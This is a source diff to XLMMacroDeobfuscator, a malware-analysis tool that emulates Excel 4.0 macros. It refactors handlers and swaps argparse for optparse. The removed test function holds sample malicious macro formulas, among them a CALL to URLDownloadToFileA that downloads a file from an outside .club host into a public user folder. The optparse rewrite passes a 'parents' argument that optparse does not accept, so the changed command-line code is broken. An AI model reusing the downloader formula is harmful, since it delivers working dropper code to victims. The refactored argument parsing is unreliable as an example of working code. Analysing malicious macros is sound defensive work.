@@ -1,13 +1,9 @@
 from __future__ import print_function
-import argparse
+import optparse
 import hashlib
-import json
 import msoffcrypto
-import os
 import sys
 import json
-import time
-from _ast import arguments
 from tempfile import mkstemp
 from lark import Lark
 from lark.exceptions import ParseError
@@ -16,7 +12,6 @@ from lark.tree import Tree
 from XLMMacroDeobfuscator.excel_wrapper import XlApplicationInternational
 from XLMMacroDeobfuscator.xlsm_wrapper import XLSMWrapper
 from XLMMacroDeobfuscator.__init__ import __version__
-import copy
 import linecache
 
 
@@ -24,7 +19,7 @@ try:
     from XLMMacroDeobfuscator.xls_wrapper import XLSWrapper
 
     HAS_XLSWrapper = True
-except:
+except Exception:
     HAS_XLSWrapper = False
     print('pywin32 is not installed (only is required if you want to use MS Excel)')
 
@@ -37,7 +32,6 @@ from XLMMacroDeobfuscator.boundsheet import *
 import os
 import operator
 import copy
-from distutils.util import strtobool
 
 
 class EvalStatus(Enum):
@@ -51,7 +45,16 @@ class EvalStatus(Enum):
     IGNORED = 8
 
 
-class EvalResult:
+def strtobool(text):
+    if text in ('y', 'yes', 't', 'true', 'on', '1'):
+        return 1
+    if text in ('n', 'no', 'f', 'false', 'off', '0'):
+        return 0
+    else:
+        raise ValueError
+
+
+class EvalResult(object):
     def __init__(self, next_cell, status, value, text):
         self.next_cell = next_cell
         self.status = status
@@ -85,7 +88,6 @@ class EvalResult:
 
     @staticmethod
     def wrap_str_literal(data):
-        result = ''
         if EvalResult.is_float(data) or (len(data) > 1 and data.startswith('"') and data.endswith('"')):
             result = str(data)
         elif type(data) is float:
@@ -196,9 +198,9 @@ class XLMInterpreter:
             'WHILE': self.while_handler,
 
             # Windows API
-            'Kernel32.VirtualAlloc': self.VirtualAlloc_handler,
-            'Kernel32.WriteProcessMemory': self.WriteProcessMemory_handler,
-            'Kernel32.RtlCopyMemory': self.RtlCopyMemory_handler,
+            'Kernel32.VirtualAlloc': self.virtual_alloc_handler,
+            'Kernel32.WriteProcessMemory': self.write_process_memory_handler,
+            'Kernel32.RtlCopyMemory': self.rtl_copy_memory_handler,
         }
 
     jump_functions = ('GOTO', 'RUN')
@@ -240,7 +242,6 @@ class XLMInterpreter:
             return False
 
     def get_parser(self):
-        xlm_parser = None
         grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro.lark.template')
         # with open(grammar_file_path, 'r') as grammar_file:
         with open(grammar_file_path, 'r') as grammar_file:
@@ -258,7 +259,8 @@ class XLMInterpreter:
 
         return xlm_parser
 
-    def get_formula_cell(self, macrosheet, col, row):
+    @staticmethod
+    def get_formula_cell(macrosheet, col, row):
         result_cell = None
         not_found = False
         row = int(row)
@@ -295,11 +297,9 @@ class XLMInterpreter:
                     label = label.strip('"')
                     root_parse_tree = self.xlm_parser.parse('=' + label)
                     res_sheet, res_col, res_row = self.get_cell_addr(current_cell, root_parse_tree.children[0])
-
-
         else:
             cell = cell_parse_tree.children[0]
-
+            last_seen = ''
             if cell.data == 'a1_notation_cell':
                 if len(cell.children) == 2:
                     cell_addr = "'{}'!{}".format(cell.children[0], cell.children[1])
@@ -450,7 +450,6 @@ class XLMInterpreter:
 
         destination_str = self.convert_ptree_to_str(destination)
 
-        text = src_eval_result.get_text(unwrap=True)
         if src_eval_result.status == EvalStatus.FullEvaluation:
             for row in range(int(dst_start_row), int(dst_end_row) + 1):
                 for col in range(Cell.convert_to_column_index(dst_start_col),
@@ -487,8 +486,8 @@ class XLMInterpreter:
         args_str = ''
         for argument in arguments:
             if type(argument) is Token or type(argument) is Tree:
-                arg_eval_Result = self.evaluate_parse_tree(current_cell, argument, False)
-                args_str += arg_eval_Result.get_text() + ','
+                arg_eval_result = self.evaluate_parse_tree(current_cell, argument, False)
+                args_str += arg_eval_result.get_text() + ','
 
         args_str = args_str.strip(',')
         return_val = text = '{}({})'.format(name, args_str)
@@ -501,19 +500,19 @@ class XLMInterpreter:
 
         # handle alias name for a function (REGISTER)
         if function_name in self._registered_functions:
-            parse_tree_root.children[0] = parse_tree_root.children[0].update(None,
-                                                                             self._registered_functions[function_name][
-                                                                                 'name'])
+            parse_tree_root.children[0] = parse_tree_root.children[0].update(
+                None, self._registered_functions[function_name]['name']
+            )
             function_name = parse_tree_root.children[0]
 
         if function_name.lower() in self.defined_names:
             try:
-                ref_parsed = self.xlm_parser.parse('='+ self.defined_names[function_name.lower()])
-                if isinstance(ref_parsed.children[0],Tree) and ref_parsed.children[0].data =='cell':
+                ref_parsed = self.xlm_parser.parse('=' + self.defined_names[function_name.lower()])
+                if isinstance(ref_parsed.children[0], Tree) and ref_parsed.children[0].data == 'cell':
                     function_name = ref_parsed.children[0]
                 else:
                     raise Exception
-            except:
+            except Exception:
                 function_name = self.defined_names[function_name.lower()]
 
         # cell_function_call
@@ -602,6 +601,8 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def get_cell_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        text = ''
+        return_val = ''
         if len(arguments) == 2:
             arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
             dst_sheet, dst_col, dst_row = self.get_cell_addr(current_cell, arguments[1])
@@ -662,17 +663,18 @@ class XLMInterpreter:
         return EvalResult(None, status, 'END.IF', 'END.IF')
 
     def get_workspace_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        return_val = ''
+        text = ''
         status = EvalStatus.Error
         if len(arguments) == 1:
-            arg1_eval_Result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
+            arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
 
-            if arg1_eval_Result.status == EvalStatus.FullEvaluation and self.is_float(arg1_eval_Result.get_text()):
-                workspace_param = self.get_workspace(int(float(arg1_eval_Result.get_text())))
+            if arg1_eval_result.status == EvalStatus.FullEvaluation and self.is_float(arg1_eval_result.get_text()):
+                workspace_param = self.get_workspace(int(float(arg1_eval_result.get_text())))
                 current_cell.value = workspace_param
-                text = 'GET.WORKSPACE({})'.format(arg1_eval_Result.get_text())
+                text = 'GET.WORKSPACE({})'.format(arg1_eval_result.get_text())
                 return_val = workspace_param
                 status = EvalStatus.FullEvaluation
-                next_cell = None
 
         if status == EvalStatus.Error:
             return_val = text = self.convert_ptree_to_str(parse_tree_root)
@@ -680,6 +682,8 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def get_window_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        return_val = ''
+        text = ''
         status = EvalStatus.Error
         if len(arguments) == 1:
             arg_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
@@ -699,6 +703,9 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def on_time_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        return_val = ''
+        text = ''
+        next_cell = None
         status = EvalStatus.Error
         if len(arguments) == 2:
             arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
@@ -727,6 +734,9 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def day_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        status = None
+        return_val = ''
+        text = ''
         if self.day_of_month is None:
             arg1_eval_result = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
             if arg1_eval_result.status == EvalStatus.FullEvaluation:
@@ -737,7 +747,6 @@ class XLMInterpreter:
                     # status = EvalStatus.FullEvaluation
 
                     return_val, status, text = self.guess_day()
-
 
                 elif self.is_float(arg1_eval_result.value):
                     text = 'DAY(Serial Date)'
@@ -777,7 +786,7 @@ class XLMInterpreter:
                     best_day = day
                     if min == 0:
                         break
-            except Exception as exp:
+            except Exception:
                 pass
         self.day_of_month = best_day
         text = str(self.day_of_month)
@@ -848,6 +857,8 @@ class XLMInterpreter:
         return EvalResult(None, status, 0, text)
 
     def mid_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        return_val = ''
+        text = ''
         sheet_name, col, row = self.get_cell_addr(current_cell, arguments[0])
         cell = self.get_cell(sheet_name, col, row)
         status = EvalStatus.PartialEvaluation
@@ -871,6 +882,7 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def goto_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        next_cell = None
         next_sheet, next_col, next_row = self.get_cell_addr(current_cell, arguments[0])
         if next_sheet is not None and next_sheet in self.xlm_wrapper.get_macrosheets():
             next_cell = self.get_formula_cell(self.xlm_wrapper.get_macrosheets()[next_sheet],
@@ -938,6 +950,9 @@ class XLMInterpreter:
         return EvalResult(None, status, return_val, text)
 
     def round_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        status = None
+        return_val = ''
+        text = ''
         arg1_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
         arg2_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
         if arg1_eval_res.status == EvalStatus.FullEvaluation and arg2_eval_res.status == EvalStatus.FullEvaluation:
@@ -972,6 +987,8 @@ class XLMInterpreter:
         return EvalResult(arg_eval_result.next_cell, status, return_val, text)
 
     def run_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        next_cell = None
+        return_val = ''
         size = len(arguments)
 
         if 1 <= size <= 2:
@@ -1066,7 +1083,7 @@ class XLMInterpreter:
 
         self._while_stack.append(stack_record)
 
-        if stack_record['status'] == False:
+        if stack_record['status'] is False:
             self.ignore_processing = True
             self.next_count = 0
 
@@ -1076,9 +1093,9 @@ class XLMInterpreter:
 
     def next_handler(self, arguments, current_cell, interactive, parse_tree_root):
         status = EvalStatus.FullEvaluation
+        next_cell = None
         if self.next_count == 0:
             self.ignore_processing = False
-            next_cell = None
             if len(self._while_stack) > 0:
                 top_record = self._while_stack.pop()
                 if top_record['status'] is True:
@@ -1133,15 +1150,15 @@ class XLMInterpreter:
         if self._function_call_stack:
             return_cell = self._function_call_stack.pop()
             return_cell.value = arg1_eval_res.value
-            arg1_eval_res.next_cell = self.get_formula_cell(return_cell.sheet,
-                                              return_cell.column,
-                                              str(int(return_cell.row) + 1))
-        if arg1_eval_res.text =='':
+            arg1_eval_res.next_cell = self.get_formula_cell(
+                return_cell.sheet, return_cell.column, str(int(return_cell.row) + 1)
+            )
+        if arg1_eval_res.text == '':
             arg1_eval_res.text = 'RETURN()'
 
         return arg1_eval_res
 
-    def VirtualAlloc_handler(self, arguments, current_cell, interactive, parse_tree_root):
+    def virtual_alloc_handler(self, arguments, current_cell, interactive, parse_tree_root):
         base_eval_res = self.evaluate_parse_tree(current_cell, arguments[0], interactive)
         size_eval_res = self.evaluate_parse_tree(current_cell, arguments[1], interactive)
         if base_eval_res.status == EvalStatus.FullEvaluation and size_eval_res.status == EvalStatus.FullEvaluation:
@@ -1165,8 +1182,10 @@ class XLMInterpreter:
         text = self.convert_ptree_to_str(parse_tree_root)
         return EvalResult(None, status, return_val, text)
 
-    def WriteProcessMemory_handler(self, arguments, current_cell, interactive, parse_tree_root):
-        status = EvalStatus.PartialEvaluation
+    def write_process_memory_handler(self, arguments, current_cell, interactive, parse_tree_root):
+        # status = EvalStatus.PartialEvaluation
+        return_val = ''
+        text = ''
         if len(arguments) > 4:
             status = EvalStatus.FullEvaluation
             args_eval_result = []
@@ -1187,9 +1206,10 @@ class XLMInterpreter:
                 text = 'Kernel32.WriteProcessMemory({},{},"{}",{},{})'.format(
                     args_eval_result[0].get_text(),
                     base_address,
-                    mem_data.hex(),
+                    "".join("{:02x}".format(x) for x in mem_data),
                     size,
-                    args_eval_result[4].get_text())
+                    args_eval_result[4].get_text(),
+                )
 
                 return_val = 0
 
@@ -1199,7 +1219,7 @@ class XLMInterpreter:
 
             return EvalResult(None, status, return_val, text)
 
-    def RtlCopyMemory_handler(self, arguments, current_cell, interactive, parse_tree_root):
+    def rtl_copy_memory_handler(self, arguments, current_cell, interactive, parse_tree_root):
         status = EvalStatus.PartialEvaluation
 
         if len(arguments) == 3:
@@ -1215,10 +1235,10 @@ class XLMInterpreter:
                     status = EvalStatus.Error
                 text = 'Kernel32.RtlCopyMemory({},"{}",{})'.format(
                     destination_eval_res.get_text(),
-                    mem_data.hex(),
+                    "".join("{:02x}".format(x) for x in mem_data),
                     size_res.get_text())
 
-        if status == status.PartialEvaluation:
+        if status == EvalStatus.PartialEvaluation:
             text = self.convert_ptree_to_str(parse_tree_root)
 
         return_val = 0
@@ -1359,7 +1379,6 @@ class XLMInterpreter:
     def evaluate_cell(self, current_cell, interactive, parse_tree_root):
         sheet_name, col, row = self.get_cell_addr(current_cell, parse_tree_root)
         return_val = ''
-        text = ''
         status = EvalStatus.PartialEvaluation
 
         if sheet_name is not None:
@@ -1431,7 +1450,7 @@ class XLMInterpreter:
                     print(ret_result.value)
                     if ret_result.status == EvalStatus.End:
                         break
-                except ParseError as exp:
+                except ParseError:
                     print("Invalid XLM macro")
                 except KeyboardInterrupt:
                     sys.exit()
@@ -1523,10 +1542,13 @@ class XLMInterpreter:
                                         break
 
                                 if self.invoke_interpreter and interactive:
-                                    self.interactive_shell(current_cell,
-                                                           'Partial Eval: {}\r\n{} is not populated, what should be its value?'.format(
-                                                               evaluation_result.text,
-                                                               self.first_unknown_cell))
+                                    self.interactive_shell(
+                                        current_cell,
+                                        'Partial Eval: {}\r\n{} is not populated, what should be its value?'.format(
+                                            evaluation_result.text,
+                                            self.first_unknown_cell,
+                                        )
+                                    )
                                     self.invoke_interpreter = False
                                     self.first_unknown_cell = None
                                     continue
@@ -1569,7 +1591,7 @@ class XLMInterpreter:
                                     break
                                 formula = current_cell.formula
                                 stack_record = False
-                except Exception as exp:
+                except Exception:
                     exc_type, exc_obj, traceback = sys.exc_info()
                     frame = traceback.tb_frame
                     lineno = traceback.tb_lineno
@@ -1581,37 +1603,6 @@ class XLMInterpreter:
                                                          line.strip(),
                                                          exc_obj),
                            silent_mode=silent_mode)
-
-
-def test_parser():
-    grammar_file_path = os.path.join(os.path.dirname(__file__), 'xlm-macro-en.lark')
-    macro_grammar = open(grammar_file_path, 'r').read()
-    xlm_parser = Lark(macro_grammar, parser='lalr')
-
-    print("\n=HALT()")
-    print(xlm_parser.parse("=HALT()"))
-    print("\n=171*GET.CELL(19,A81)")
-    print(xlm_parser.parse("=171*GET.CELL(19,A81)"))
-    print("\n=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)")
-    print(xlm_parser.parse("=FORMULA($ET$1796&$BE$1701&$DB$1527&$BU$714&$CT$1605)"))
-    print("\n=RUN($DC$240)")
-    print(xlm_parser.parse("=RUN($DC$240)"))
-    print("\n=CHAR($IE$1109-308)")
-    print(xlm_parser.parse("=CHAR($IE$1109-308)"))
-    print("\n=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)")
-    print(xlm_parser.parse("=CALL($C$649,$FN$698,$AM$821,0,$BB$54,$BK$36,0,0)"))
-    print("\n=HALT()")
-    print(xlm_parser.parse("=HALT()"))
-    print('\n=WAIT(NOW()+"00:00:03")')
-    print(xlm_parser.parse('=WAIT(NOW()+"00:00:03")'))
-    print("\n=IF(GET.WORKSPACE(19),,CLOSE(TRUE))")
-    print(xlm_parser.parse("=IF(GET.WORKSPACE(19),,CLOSE(TRUE))"))
-    print(r'\n=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")')
-    print(xlm_parser.parse(r'=OPEN(GET.WORKSPACE(48)&"\WZTEMPLT.XLA")'))
-    print(
-        """\n=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)""")
-    print(xlm_parser.parse(
-        """=IF(R[-1]C<0,CALL("urlmon","URLDownloadToFileA","JJCCJJ",0,"https://ddfspwxrb.club/fb2g424g","c:\\Users\\Public\\bwep5ef.html",0,0),)"""))
 
 
 _thismodule_dir = os.path.normpath(os.path.abspath(os.path.dirname(__file__)))
@@ -1721,7 +1712,7 @@ def convert_to_json_str(file, defined_names, records, memory=None, files=None):
             res['memory_records'].append({
                 'base': mem_rec['base'],
                 'size': mem_rec['size'],
-                'data_base64': bytearray(mem_rec['data']).hex()
+                'data_base64': "".join("{:02x}".format(x) for x in bytearray(mem_rec['data'])),
             })
 
     return res
@@ -1745,7 +1736,7 @@ def try_decrypt(file, password=''):
                 tmp_file_handle, tmp_file_path = mkstemp(**temp_file_args)
                 with os.fdopen(tmp_file_handle, 'wb') as tmp_file:
                     msoffcrypto_obj.decrypt(tmp_file)
-            except:
+            except Exception:
                 if tmp_file_handle:
                     tmp_file_handle.close()
                     os.remove(tmp_file_path)
@@ -1831,7 +1822,7 @@ def process_file(**kwargs):
                 try:
                     excel_doc = XLSWrapper(file_path)
 
-                except Exception as exp:
+                except Exception:
                     print("Error: MS Excel is not installed, now xlrd2 library will be used insteads\n" +
                           "(Use --no-ms-excel switch if you do not have/want to use MS Excel)")
                     excel_doc = XLSWrapper2(file_path)
@@ -1922,9 +1913,11 @@ def process_file(**kwargs):
 
             if not kwargs.get("export_json") and not kwargs.get("return_deobfuscated"):
                 for mem_record in interpreter._memory:
-                    uprint('Memory: base {}, size {}\n{}\n'.format(mem_record['base'],
-                                                                   mem_record['size'],
-                                                                   bytearray(mem_record['data']).hex()))
+                    uprint('Memory: base {}, size {}\n{}\n'.format(
+                        mem_record['base'],
+                        mem_record['size'],
+                        "".join("{:02x}".format(x) for x in bytearray(mem_record['data'])),
+                    ))
 
             uprint('[END of Deobfuscation]', silent_mode=SILENT)
 
@@ -1959,58 +1952,60 @@ def main():
     print('XLMMacroDeobfuscator(v{}) - {}\n'.format(__version__,
                                                     "https://github.com/DissectMalware/XLMMacroDeobfuscator"))
 
-    config_parser = argparse.ArgumentParser(add_help=False)
+    config_parser = optparse.OptionParser()
 
-    config_parser.add_argument("-c", "--config-file",
+    config_parser.add_option("-c", "--config-file",
                              help="Specify a config file (must be a valid JSON file)", metavar="FILE_PATH")
-    args, remaining_argv = config_parser.parse_known_args()
+    args, remaining_argv = config_parser.parse_args()
 
     defaults = {}
 
     if args.config_file:
         try:
-            with open(args.config_file,'r',encoding='utf_8') as config_file:
-                defaults = json.load(config_file)
-                defaults = {x.replace('-','_'): y for x, y in defaults.items()}
-        except json.decoder.JSONDecodeError as json_exp:
+            with open(args.config_file, 'r', encoding='utf_8') as config_file:
+                raw_defaults = json.load(config_file)
+                defaults = {}
+                for x, y in raw_defaults.items():
+                    defaults.update({x.replace('-','_'): y})
+        except json.JSONDecodeError:
             uprint(
                 'Config file cannot be parsed (must be a valid json file, '
                 'validate your file with an online JSON validator)',
                 silent_mode=SILENT)
 
-    arg_parser = argparse.ArgumentParser(parents=[config_parser])
+    arg_parser = optparse.OptionParser(parents=[config_parser])
 
-    arg_parser.add_argument("-f", "--file", type=str, action='store',
-                            help="The path of a XLSM file", metavar=('FILE_PATH'))
-    arg_parser.add_argument("-n", "--noninteractive", default=False, action='store_true',
-                            help="Disable interactive shell")
-    arg_parser.add_argument("-x", "--extract-only", default=False, action='store_true',
-                            help="Only extract cells without any emulation")
-    arg_parser.add_argument("-2", "--no-ms-excel", default=False, action='store_true',
-                            help="[Deprecated] Do not use MS Excel to process XLS files")
-    arg_parser.add_argument("--with-ms-excel", default=False, action='store_true',
-                            help="Use MS Excel to process XLS files")
-    arg_parser.add_argument("-s", "--start-with-shell", default=False, action='store_true',
-                            help="Open an XLM shell before interpreting the macros in the input")
-    arg_parser.add_argument("-d", "--day", type=int, default=-1, action='store',
-                            help="Specify the day of month", )
-    arg_parser.add_argument("--output-formula-format", type=str,
-                            default="CELL:[[CELL-ADDR]], [[STATUS]], [[INT-FORMULA]]",
-                            action='store',
-                            help="Specify the format for output formulas "
-                                 "([[CELL-ADDR]], [[INT-FORMULA]], and [[STATUS]]", )
-    arg_parser.add_argument("--no-indent", default=False, action='store_true',
-                            help="Do not show indent before formulas")
-    arg_parser.add_argument("--export-json", type=str, action='store',
-                            help="Export the output to JSON", metavar=('FILE_PATH'))
-    arg_parser.add_argument("--start-point", type=str, default="", action='store',
-                            help="Start interpretation from a specific cell address", metavar=('CELL_ADDR'))
-    arg_parser.add_argument("-p", "--password", type=str, action='store', default='',
-                            help="Password to decrypt the protected document")
-    arg_parser.add_argument("-o", "--output-level", type=int, action='store', default=0,
-                            help="Set the level of details to be shown "
-                                 "(0:all commands, 1: commands no jump "
-                                 "2:important commands 3:strings in important commands).")
+    arg_parser.add_option("-f", "--file", type=str, action='store',
+                          help="The path of a XLSM file", metavar='FILE_PATH')
+    arg_parser.add_option("-n", "--noninteractive", default=False, action='store_true',
+                          help="Disable interactive shell")
+    arg_parser.add_option("-x", "--extract-only", default=False, action='store_true',
+                          help="Only extract cells without any emulation")
+    arg_parser.add_option("-2", "--no-ms-excel", default=False, action='store_true',
+                          help="[Deprecated] Do not use MS Excel to process XLS files")
+    arg_parser.add_option("--with-ms-excel", default=False, action='store_true',
+                          help="Use MS Excel to process XLS files")
+    arg_parser.add_option("-s", "--start-with-shell", default=False, action='store_true',
+                          help="Open an XLM shell before interpreting the macros in the input")
+    arg_parser.add_option("-d", "--day", type=int, default=-1, action='store',
+                          help="Specify the day of month", )
+    arg_parser.add_option("--output-formula-format", type=str,
+                          default="CELL:[[CELL-ADDR]], [[STATUS]], [[INT-FORMULA]]",
+                          action='store',
+                          help="Specify the format for output formulas "
+                               "([[CELL-ADDR]], [[INT-FORMULA]], and [[STATUS]]", )
+    arg_parser.add_option("--no-indent", default=False, action='store_true',
+                          help="Do not show indent before formulas")
+    arg_parser.add_option("--export-json", type=str, action='store',
+                          help="Export the output to JSON", metavar=('FILE_PATH'))
+    arg_parser.add_option("--start-point", type=str, default="", action='store',
+                          help="Start interpretation from a specific cell address", metavar=('CELL_ADDR'))
+    arg_parser.add_option("-p", "--password", type=str, action='store', default='',
+                          help="Password to decrypt the protected document")
+    arg_parser.add_option("-o", "--output-level", type=int, action='store', default=0,
+                          help="Set the level of details to be shown "
+                               "(0:all commands, 1: commands no jump "
+                               "2:important commands 3:strings in important commands).")
 
     arg_parser.set_defaults(**defaults)
 
@@ -2025,7 +2020,7 @@ def main():
         # Convert args to kwarg dict
         try:
             process_file(**vars(args))
-        except Exception as exp:
+        except Exception:
             exc_type, exc_obj, traceback = sys.exc_info()
             frame = traceback.tb_frame
             lineno = traceback.tb_lineno
@@ -2036,7 +2031,6 @@ def main():
                                                  lineno,
                                                  line.strip(),
                                                  exc_obj))
-
 
 
 SILENT = False
